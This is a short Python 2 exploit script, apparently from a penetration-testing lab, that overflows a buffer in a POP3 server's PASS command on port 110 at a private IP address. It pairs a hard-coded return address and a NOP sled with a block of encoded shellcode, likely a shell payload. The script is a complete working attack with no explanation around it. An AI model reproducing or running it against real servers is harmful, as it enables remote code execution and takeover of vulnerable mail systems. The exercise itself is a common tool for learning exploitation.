#!/usr/bin/python
import socket

shellcode = (
"\xbb\xc0\x8f\x2c\xf1\xd9\xcf\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x58\x12\x83\xe8\xfc\x03\x98\x81\xce\x04\xe4\x76\x8c"
"\xe7\x14\x87\xf1\x6e\xf1\xb6\x31\x14\x72\xe8\x81\x5e\xd6\x05"
"\x69\x32\xc2\x9e\x1f\x9b\xe5\x17\x95\xfd\xc8\xa8\x86\x3e\x4b"
"\x2b\xd5\x12\xab\x12\x16\x67\xaa\x53\x4b\x8a\xfe\x0c\x07\x39"
"\xee\x39\x5d\x82\x85\x72\x73\x82\x7a\xc2\x72\xa3\x2d\x58\x2d"
"\x63\xcc\x8d\x45\x2a\xd6\xd2\x60\xe4\x6d\x20\x1e\xf7\xa7\x78"
"\xdf\x54\x86\xb4\x12\xa4\xcf\x73\xcd\xd3\x39\x80\x70\xe4\xfe"
"\xfa\xae\x61\xe4\x5d\x24\xd1\xc0\x5c\xe9\x84\x83\x53\x46\xc2"
"\xcb\x77\x59\x07\x60\x83\xd2\xa6\xa6\x05\xa0\x8c\x62\x4d\x72"
"\xac\x33\x2b\xd5\xd1\x23\x94\x8a\x77\x28\x39\xde\x05\x73\x56"
"\x13\x24\x8b\xa6\x3b\x3f\xf8\x94\xe4\xeb\x96\x94\x6d\x32\x61"
"\xda\x47\x82\xfd\x25\x68\xf3\xd4\xe1\x3c\xa3\x4e\xc3\x3c\x28"
"\x8e\xec\xe8\xff\xde\x42\x43\x40\x8e\x22\x33\x28\xc4\xac\x6c"
"\x48\xe7\x66\x05\xe3\x12\xe1\x20\xff\x1c\x43\x5c\xfd\x1c\xa2"
"\x26\x88\xfa\xce\x48\xdd\x55\x67\xf0\x44\x2d\x16\xfd\x52\x48"
"\x18\x75\x51\xad\xd7\x7e\x1c\xbd\x80\x8e\x6b\x9f\x07\x90\x41"
"\xb7\xc4\x03\x0e\x47\x82\x3f\x99\x10\xc3\x8e\xd0\xf4\xf9\xa9"
"\x4a\xea\x03\x2f\xb4\xae\xdf\x8c\x3b\x2f\xad\xa9\x1f\x3f\x6b"
"\x31\x24\x6b\x23\x64\xf2\xc5\x85\xde\xb4\xbf\x5f\x8c\x1e\x57"
"\x19\xfe\xa0\x21\x26\x2b\x57\xcd\x97\x82\x2e\xf2\x18\x43\xa7"
"\x8b\x44\xf3\x48\x46\xcd\x13\xab\x42\x38\xbc\x72\x07\x81\xa1"
"\x84\xf2\xc6\xdf\x06\xf6\xb6\x1b\x16\x73\xb2\x60\x90\x68\xce"
"\xf9\x75\x8e\x7d\xf9\x5f"
)

buffer= "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C"*(3500-2606-351-16)

try:
    print "\n Sending payload..."
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('10.11.24.58',110))
    s.recv(1024)
    s.send('USER test\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!"
except:
    print "Could not connect to pop3!"

    
